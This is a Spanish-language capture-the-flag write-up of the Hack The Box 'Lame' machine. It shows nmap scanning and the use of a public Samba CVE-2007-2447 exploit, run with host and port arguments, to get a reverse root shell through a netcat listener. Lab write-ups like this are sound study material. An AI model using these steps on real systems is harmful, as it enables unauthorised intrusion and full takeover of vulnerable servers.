#  LAME MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LAME/images/1.PNG)

## INDEX

- [[#ESCANEO Y ENUMERACION|ESCANEO Y ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
- [[#ELEVACION DE PRIVILEGIOS|ELEVACION DE PRIVILEGIOS]]


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```
nmap -p- --open -T5 - v -n 10.10.10.3 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LAME/images/2.PNG)

Vamos a realizar una enumeracion de los servicios en los puertos:

```
nmap -p21,22,139,445,3632 -sV -sC 10.10.10.3 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LAME/images/3.PNG)

## EXPLOTACION

Vemos que tiene el samba activado y la version es 3.0.X que es desactualizado, sibuscamos esa version en google junto a la palabra exploit encontramos el siguiente repositorio de github:

[https://github.com/amriunix/CVE-2007-2447](https://github.com/amriunix/CVE-2007-2447)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LAME/images/4.PNG)

estos son los pasos de instalacion:

```bash
sudo apt install python python-pip #si no tienes pip2
pip install --user pysmb
git clone https://github.com/amriunix/CVE-2007-2447.git
```

la forma de ejecucion:

```bash
python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LAME/images/5.PNG)

nos ponemos a la escucha en netcat y obtenemos una conexion reversa como root:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LAME/images/6.PNG)

## ELEVACION DE PRIVILEGIOS

No necesitamos elevar privilegios porque somos root y podemos ver las 2 flags:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LAME/images/7.PNG)